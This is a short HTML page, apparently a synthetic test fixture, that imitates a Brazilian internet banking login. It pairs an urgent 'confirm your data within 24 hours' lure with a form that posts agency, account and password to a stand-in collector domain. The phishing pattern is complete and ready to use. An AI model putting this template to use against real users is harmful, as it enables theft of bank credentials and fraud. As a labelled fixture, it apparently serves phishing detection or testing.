<!doctype html>
<html lang="pt-BR">
  <head>
    <meta charset="utf-8">
    <title>Internet Banking | Acesse sua conta</title>
  </head>
  <body>
    <h1>Acesse sua conta</h1>
    <p>Atualização obrigatória: confirme seus dados em até 24 horas.</p>
    <!-- Fixture sintético: o domínio e o destino são inventados. -->
    <form method="post" action="https://coletor-dados.example.net/receber">
      <label>Agência <input type="text" name="agencia"></label>
      <label>Conta <input type="text" name="conta"></label>
      <label>Senha <input type="password" name="senha"></label>
      <button type="submit">Entrar</button>
    </form>
  </body>
</html>
